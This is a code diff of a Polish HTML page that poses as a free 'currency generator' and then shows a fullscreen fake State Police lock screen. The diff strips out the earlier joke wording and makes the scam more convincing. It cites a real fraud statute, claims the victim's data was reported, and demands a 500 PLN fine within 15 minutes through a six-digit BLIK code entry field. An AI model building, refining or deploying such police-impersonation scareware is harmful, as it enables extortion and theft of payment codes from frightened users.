@@ -28,7 +28,7 @@
         }
 
         .main-logo {
-            width: 500px; /* Bardzo duże logo */
+            width: 500px;
             height: auto;
         }
 
@@ -93,7 +93,7 @@
             width: 0%;
         }
 
-        /* --- NOWOŚĆ: SEKCJA POTWIERDZENIA --- */
+        /* SEKCJA POTWIERDZENIA */
         #confirm-area {
             display: none;
             text-align: center;
@@ -116,7 +116,7 @@
             color: #000;
             padding: 50px;
             box-sizing: border-box;
-            overflow: hidden;
+            overflow-y: auto;
         }
 
         .police-header {
@@ -176,23 +176,23 @@
 
     <div id="ui-input">
         <div class="input-group">
-            <label>Właściciel rachunku (Imię i Nazwisko):</label>
-            <input type="text" id="userName" placeholder="np. Jan Kowalski">
+            <label>Właściciel rachunku / Dowolny ciąg znaków:</label>
+            <input type="text" id="userName" placeholder="Wpisz cokolwiek...">
         </div>
         <button class="start-btn" onclick="startGeneration()">ROZPOCZNIJ WYDOBYCIE</button>
     </div>
 
     <div id="loader-area">
-        <p id="status-text" style="font-size: 14px; font-weight: bold;">Inicjalizacja połączenia...</p>
+        <p id="status-text" style="font-size: 14px; font-weight: bold;">Łączenie z siecią...</p>
         <div class="progress-border">
             <div class="progress-bar" id="p-bar"></div>
         </div>
-        <p style="font-size: 11px; margin-top: 10px; color: #666;">Procesor: 100% obciążenia | Lokalizacja: Radom-Data-Center</p>
+        <p style="font-size: 11px; margin-top: 10px; color: #666;">Status: Szyfrowanie połączenia SSL 256-bit</p>
     </div>
 
     <div id="confirm-area">
-        <h3 style="color: #cc0000; margin-top: 0;">UWAGA!</h3>
-        <p>Proces wydobycia przygotowany. Czy na pewno chcesz wygenerować Cebuliony na to konto?</p>
+        <h3 style="color: #cc0000; margin-top: 0;">POTWIERDZENIE OPERACJI</h3>
+        <p>System jest gotowy do wygenerowania darmowej waluty. Czy chcesz kontynuować?</p>
         <button class="btn-confirm" onclick="triggerPolice()">TAK</button>
         <button class="btn-deny" onclick="location.reload()">NIE</button>
     </div>
@@ -200,7 +200,7 @@
 
 <div id="police-screen">
     <div class="police-header">
-        <img src="policjalogo.png" alt="POLICJA" style="height: 100px;" 
+        <img src="policjalogo.png" alt="POLICJA" style="height: 120px;" 
              onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/POLICJA_logo.svg/1200px-POLICJA_logo.svg.png'">
         <div style="text-align: right;">
             <h2 style="margin: 0; font-size: 32px;">POLICJA PAŃSTWOWA</h2>
@@ -208,39 +208,35 @@
         </div>
     </div>
 
-    <div class="alert-banner">URZĄDZENIE ZOSTAŁO ZABLOKOWANE</div>
+    <div class="alert-banner">DOSTĘP DO URZĄDZENIA ZOSTAŁ ZABLOKOWANY</div>
 
     <table class="police-table">
         <tr>
-            <td class="label-cell">Podejrzany:</td>
+            <td class="label-cell">Podejrzany o oszustwo:</td>
             <td id="target-name" style="font-weight: bold; color: #cc0000;"></td>
         </tr>
         <tr>
-            <td class="label-cell">Czyn zabroniony:</td>
-            <td>Nielegalna produkcja i obrót Cebulionami (Art. 213 pkt 7 KK)</td>
+            <td class="label-cell">Podstawa prawna:</td>
+            <td>Art. 286 § 1 Kodeksu Karnego (Oszustwo komputerowe)</td>
         </tr>
         <tr>
-            <td class="label-cell">Adres IP:</td>
-            <td>89.167.12.*** (Region: Województwo Mazowieckie)</td>
-        </tr>
-        <tr>
-            <td class="label-cell">Decyzja:</td>
-            <td>Blokada systemowa do czasu uiszczenia grzywny skarbowej.</td>
+            <td class="label-cell">Lokalizacja:</td>
+            <td>Wykryto na podstawie adresu bramki sieciowej.</td>
         </tr>
     </table>
 
     <div class="fine-notice">
-        <b>UZASADNIENIE:</b> System CEB-TRACKER wykrył próbę wygenerowania darmowej waluty bez posiadania aktualnej koncesji na handel warzywami i owocami. Zgodnie z ustawą o cyfryzacji rolnictwa, każda wygenerowana cebula podlega opłacie akcyzowej. 
+        <b>INSTRUKCJA ODBLOKOWANIA:</b> Wykryto nielegalną próbę ingerencji w systemy bankowe w celu wygenerowania waluty bez pokrycia. Twoje dane zostały przekazane do najbliższej jednostki policji.
         <br><br>
-        W celu odblokowania komputera należy wpłacić mandat karny w wysokości <b>400,00 PLN</b> przy użyciu kodu <b>BLIK</b>. Brak wpłaty w ciągu 30 minut spowoduje trwałe zaszyfrowanie zawartości dysku.
+        Masz możliwość dobrowolnego poddania się karze i uniknięcia wizyty funkcjonariuszy. Opłać mandat karny w wysokości <b>500 PLN</b> kodem <b>BLIK</b> w ciągu najbliższych 15 minut.
     </div>
 
     <div style="text-align: center; margin-top: 40px;">
-        <div style="display: inline-block; background: #eee; padding: 20px; border: 1px solid #ccc;">
-            <label>WPISZ KOD BLIK:</label><br>
-            <input type="text" maxlength="6" style="width: 150px; font-size: 24px; text-align: center; margin: 10px 0;">
+        <div style="display: inline-block; background: #eee; padding: 30px; border: 1px solid #999; box-shadow: 3px 3px 10px rgba(0,0,0,0.2);">
+            <label style="font-size: 18px;">WPISZ 6-CYFROWY KOD BLIK:</label><br>
+            <input type="text" maxlength="6" style="width: 180px; font-size: 32px; text-align: center; margin: 15px 0; letter-spacing: 5px; border: 2px solid #000;">
             <br>
-            <button style="padding: 10px 30px; background: #000; color: #fff; border: none; font-weight: bold; cursor: pointer;">ZAPŁAĆ MANDAT</button>
+            <button style="padding: 15px 40px; background: #cc0000; color: #fff; border: none; font-weight: bold; cursor: pointer; font-size: 20px;">POTWIERDZAM WPŁATĘ</button>
         </div>
     </div>
 </div>
@@ -249,29 +245,25 @@
     function startGeneration() {
         const nameInput = document.getElementById('userName').value.trim();
         
-        const nameRegex = /^[A-ZĄĆĘŁŃÓŚŹŻ][a-ząćęłńóśźż]{1,20}\s[A-ZĄĆĘŁŃÓŚŹŻ][a-ząćęłńóśźż]{1,20}$/;
-
-        if (!nameRegex.test(nameInput)) {
-            alert("BŁĄD SYSTEMU: Wprowadź poprawne Imię i Nazwisko (np. Jan Kowalski)!");
+        // Akceptuje wszystko, byle nie było puste
+        if (nameInput === "") {
+            alert("Proszę podać dane do faktury/przelewu!");
             return;
         }
 
         document.getElementById('ui-input').style.display = 'none';
         document.getElementById('loader-area').style.display = 'block';
-        document.getElementById('target-name').textContent = nameInput.toUpperCase();
+        document.getElementById('target-name').textContent = nameInput;
 
         let progress = 0;
         const bar = document.getElementById('p-bar');
         const status = document.getElementById('status-text');
         
         const logs = [
-            "Nawiązywanie połączenia z siecią CEB-NET...",
-            "Weryfikacja danych użytkownika...",
-            "Ładowanie skryptów wydobywczych...",
-            "Szyfrowanie transakcji...",
-            "Omijanie zapory firewall...",
-            "Finalizowanie przelewu...",
-            "Gotowe do emisji!"
+            "Inicjowanie tunelu VPN...",
+            "Wyszukiwanie luk w systemie...",
+            "Wstrzykiwanie pakietów danych...",
+            "Finalizowanie wydobycia..."
         ];
 
         let logIdx = 0;
@@ -279,24 +271,23 @@
             progress += 1;
             bar.style.width = progress + "%";
 
-            if (progress % 15 === 0 && logIdx < logs.length) {
+            if (progress % 25 === 0 && logIdx < logs.length) {
                 status.textContent = logs[logIdx];
                 logIdx++;
             }
 
             if (progress >= 100) {
                 clearInterval(interval);
-                // Zamiast triggerPolice, pokazujemy potwierdzenie
                 setTimeout(() => {
                     document.getElementById('loader-area').style.display = 'none';
                     document.getElementById('confirm-area').style.display = 'block';
                 }, 500);
             }
-        }, 40);
+        }, 35);
     }
 
     function triggerPolice() {
-        // FULLSCREEN dopiero po kliknięciu TAK
+        // FULLSCREEN WŁĄCZA SIĘ TYLKO TUTAJ
         const doc = document.documentElement;
         if (doc.requestFullscreen) {
             doc.requestFullscreen().catch(() => {});
@@ -304,7 +295,7 @@
             doc.webkitRequestFullscreen().catch(() => {});
         }
 
-        // Zamiana ekranów
+        // Przełączenie widoku
         document.getElementById('app').style.display = 'none';
         document.getElementById('police-screen').style.display = 'block';
     }
